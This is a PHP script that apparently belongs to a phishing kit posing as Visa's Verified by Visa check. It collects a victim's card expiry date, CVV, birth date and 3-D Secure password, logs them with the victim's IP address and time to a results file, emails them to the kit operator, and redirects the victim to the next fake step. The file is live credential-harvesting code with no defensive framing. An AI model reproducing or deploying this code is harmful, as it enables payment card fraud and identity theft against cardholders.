<?php

session_start();

include './email.php';

if(isset($_POST['password_vbv'])){
	if(!empty($_POST['password_vbv'])){

$dt_1 = $_POST['dt_1'];

$dt_2 = $_POST['dt_2'];

$cart_val = $_POST['cart_val'];

$b_date = $_POST['b_date'];

$m_date  = $_POST['m_date'];

$y_date = $_POST['y_date'];

$password_vbv = $_POST['password_vbv'];




$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$wiz = "rez_visa";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = " vbv visa <3 <3 -  [ " .$ip. " - " .$wiz. " ] ";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From:vbv_Cart visa" . "\r\n";

$message = "
<html>
<br>
</font><br>

[Card Expiration Date]  = <font style='color:#0070ba;'> ".$dt_1. '/' . $dt_2."</font><br>
[Card Validation Code] = <font style='color:#0070ba;'>".$cart_val."</font><br>
[Birth Date] = <font style='color:#0070ba;'>".$b_date. '/' . $m_date . '/' . $y_date."</font><br>
[Password or SecureCode(3d)] = <font style='color:#0070ba;'>".$password_vbv."</font><br>
[IP]          = <font style='color:#0070ba;'>"."http://www.geoiptool.com/?IP=".$ip."</font><br>
[TIME]    =   <font color='#3366FF'>".$time."</font><br>

";

$txt = fopen('../../rezlt.html', 'a');
fwrite($txt, $message);
fclose($txt);

mail($yourmail, $subject, $message , $headers);

 header("location:../step4.php?websrc=".md5('X-moustache')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");

 }else{
	header("Location: ../lodvbv.php");
}}else{
	header("Location: ../lodvbv.php");
}